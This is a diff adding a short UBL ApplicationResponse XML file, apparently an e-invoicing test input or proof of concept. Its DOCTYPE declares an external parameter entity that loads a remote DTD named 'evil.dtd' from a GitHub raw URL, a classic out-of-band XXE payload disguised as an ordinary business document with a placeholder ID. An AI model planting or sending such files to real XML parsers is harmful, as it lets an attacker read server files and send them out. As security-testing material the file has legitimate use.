@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ApplicationResponse [
+  <!ENTITY % ext SYSTEM "https://raw.githubusercontent.com/Nuri4444/Public/<commit-sha>/evil.dtd">
+  %ext;
+]>
+<ApplicationResponse xmlns:cbc="urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2"
+                     xmlns="urn:oasis:names:specification:ubl:schema:xsd:ApplicationResponse-2">
+  <cbc:ID>x</cbc:ID>
+</ApplicationResponse>
